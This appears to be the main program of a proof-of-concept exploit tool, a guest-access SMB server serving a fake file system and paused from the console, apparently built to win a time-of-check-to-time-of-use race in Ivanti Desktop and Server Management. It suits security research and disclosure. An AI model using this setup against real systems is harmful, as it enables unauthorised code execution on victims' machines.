//  This file is part of WindowsMemoryAccessTraps.
//  Copyright (C) Google LLC 2021
//
//  WindowsMemoryAccessTraps is free software: you can redistribute it and/or modify
//  it under the terms of the GNU General Public License as published by
//  the Free Software Foundation, either version 3 of the License, or
//  (at your option) any later version.
//
//  WindowsMemoryAccessTraps is distributed in the hope that it will be useful,
//  but WITHOUT ANY WARRANTY; without even the implied warranty of
//  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
//  GNU General Public License for more details.
//
//  You should have received a copy of the GNU General Public License
//  along with WindowsMemoryAccessTraps.  If not, see <http://www.gnu.org/licenses/>.

using SMBLibrary;
using SMBLibrary.Adapters;
using SMBLibrary.Authentication.GSSAPI;
using SMBLibrary.Authentication.NTLM;
using SMBLibrary.Server;
using System.Net;
using System.Net.NetworkInformation;

namespace TOCTOUSmbServer
{
    class Program
    {
        public static AutoResetEvent ContinueEvent = new AutoResetEvent(false);

        static void ListIpAddresses()
        {
            foreach (var intf in NetworkInterface.GetAllNetworkInterfaces())
            {
                if (intf.OperationalStatus != OperationalStatus.Up)
                {
                    continue;
                }

                foreach (var addr in intf.GetIPProperties().UnicastAddresses)
                {
                    Console.WriteLine(addr.Address);
                }
            }
        }

        static void Main(string[] args)
        {
            try
            {
                Console.WriteLine("TOCTOU SMB Server (c) CODE WHITE GmbH 2025");
                Console.WriteLine("https://code-white.com/blog/ivanti-desktop-and-server-management/\n");

                ListIpAddresses();
                var shares = new SMBShareCollection
                {
                    new FileSystemShare("root", new NTFileSystemAdapter(new FakeFileSystem()), CachingPolicy.NoCaching),
                };
                var auth = new IndependentNTLMAuthenticationProvider(u => u == "Guest" ? string.Empty : null);
                GSSProvider securityProvider = new GSSProvider(auth);
                var server = new SMBServer(shares, securityProvider);
                server.LogEntryAdded += (s, e) => Console.WriteLine(e.Message);

                try
                {
                    server.Start(IPAddress.Any, SMBTransportType.DirectTCPTransport, true, true, true);
                    Console.WriteLine("Server started.");

                    string line = Console.ReadLine()?.Trim();

                    while (line != null)
                    {
                        line = line.ToLower();

                        if (line == "x")
                        {
                            break;
                        }

                        if (line == "c")
                        {
                            ContinueEvent.Set();
                        }

                        line = Console.ReadLine()?.Trim();
                    }
                }

                finally
                {
                    server.Stop();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
